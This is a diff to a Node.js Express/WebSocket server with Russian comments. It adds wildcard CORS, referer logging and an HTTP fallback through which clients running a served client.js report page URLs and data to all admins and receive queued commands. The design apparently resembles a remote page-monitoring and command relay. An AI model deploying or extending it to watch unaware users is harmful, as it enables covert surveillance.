@@ -8,9 +8,14 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
+// Обязательно добавляем парсер JSON для обработки HTTP запросов
+app.use(express.json({ limit: '5mb' }));
+
 // Хранилище клиентов и админов
 const clients = new Map();
 const admins = new Map();
+// Хранилище для ожидающих команд для HTTP клиентов
+const pendingCommands = new Map();
 
 // Настройки по умолчанию
 const defaultSettings = {
@@ -20,6 +25,26 @@ const defaultSettings = {
 };
 
 let settings = { ...defaultSettings };
+
+// Middleware для логирования запросов
+app.use((req, res, next) => {
+    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent'] || 'Unknown UA'}`);
+    next();
+});
+
+// Настройка CORS (перемещаем до раздачи статических файлов)
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, X-Client-Id');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  
+  // Обработка preflight запросов
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+  
+  next();
+});
 
 // Раздача статических файлов
 app.use(express.static(path.join(__dirname, 'public')));
@@ -58,25 +83,24 @@ app.get('/ws-status', (req, res) => {
     res.json(status);
 });
 
-// Настройка CORS
-app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, X-Client-Id');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  
-  // Обработка preflight запросов
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-  
-  next();
-});
-
 // Маршрут для client.js с правильными заголовками
 app.get('/client.js', (req, res) => {
+  console.log(`Запрос client.js от ${req.headers['user-agent']} из ${req.headers['referer'] || 'Unknown source'}`);
   res.header('Content-Type', 'application/javascript');
   res.header('Access-Control-Allow-Origin', '*');
   res.sendFile(path.join(__dirname, 'public', 'client.js'));
+});
+
+// Добавляем диагностический эндпоинт для проверки соединения
+app.get('/connection-test', (req, res) => {
+  res.json({
+    success: true,
+    timestamp: Date.now(),
+    message: 'Server is reachable via HTTP',
+    cors: 'enabled',
+    clientCount: clients.size,
+    adminCount: admins.size
+  });
 });
 
 // HTTP API endpoint для клиентов, у которых не работает WebSocket
@@ -84,7 +108,7 @@ app.post('/api/data', (req, res) => {
   const data = req.body;
   const clientId = req.headers['x-client-id'] || null;
   
-  console.log(`Получен HTTP запрос от клиента ${clientId || 'без ID'}:`, data);
+  console.log(`HTTP API: Получен запрос от клиента ${clientId || 'без ID'}, тип: ${data?.type || 'неизвестно'}`);
   
   let responseData = {
     success: true,
@@ -97,44 +121,49 @@ app.post('/api/data', (req, res) => {
     const newClientId = clientId || `client_http_${Date.now()}`;
     
     responseData.clientId = newClientId;
-    console.log(`Зарегистрирован новый HTTP клиент с ID: ${newClientId}`);
+    console.log(`Зарегистрирован новый HTTP клиент с ID: ${newClientId}, URL: ${data.url}`);
     
     // Добавляем клиента в список клиентов, если его там еще нет
     if (!clients.has(newClientId)) {
       clients.set(newClientId, {
         id: newClientId,
-        url: data.url,
-        title: data.title,
-        connectedAt: Date.now(),
-        lastActivity: Date.now(),
+        isPaused: false,
+        data: {
+          url: data.url,
+          title: data.title,
+          lastUpdate: Date.now()
+        },
         isHttpClient: true
       });
       
       // Уведомляем всех администраторов о новом клиенте
-      notifyAdmins('clientConnected', {
-        clientId: newClientId,
-        url: data.url,
-        title: data.title
+      broadcastToAdmins({
+        type: 'clientList',
+        clients: getClientsList()
       });
     } else {
       // Обновляем информацию о существующем клиенте
       const client = clients.get(newClientId);
-      client.url = data.url;
-      client.title = data.title;
-      client.lastActivity = Date.now();
+      client.data.url = data.url;
+      client.data.title = data.title;
+      client.data.lastUpdate = Date.now();
     }
   } else if (data.type === 'data' && clientId) {
     // Обрабатываем данные от клиента
     const client = clients.get(clientId);
     
     if (client) {
-      client.lastActivity = Date.now();
+      client.data.lastUpdate = Date.now();
+      client.data.title = data.payload?.title || client.data.title;
       
-      // Пересылаем данные от клиента всем администраторам, отслеживающим этого клиента
-      notifyAdminsTrackingClient(clientId, 'clientData', {
-        clientId: clientId,
+      // Передаем данные всем админам
+      broadcastToAdmins({
+        type: 'clientData',
+        clientId,
         data: data.payload
       });
+    } else {
+      console.log(`HTTP API: Клиент с ID ${clientId} не найден в списке клиентов`);
     }
   }
   
@@ -147,13 +176,13 @@ app.post('/api/data', (req, res) => {
     pendingCommands.delete(clientId);
   }
   
+  // Возвращаем текущие настройки клиенту
+  responseData.settings = {
+    updateInterval: settings.updateInterval,
+    messageOpacity: settings.messageOpacity
+  };
+  
   res.json(responseData);
-});
-
-// Middleware для логирования запросов
-app.use((req, res, next) => {
-    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
-    next();
 });
 
 // Обработка WebSocket подключений
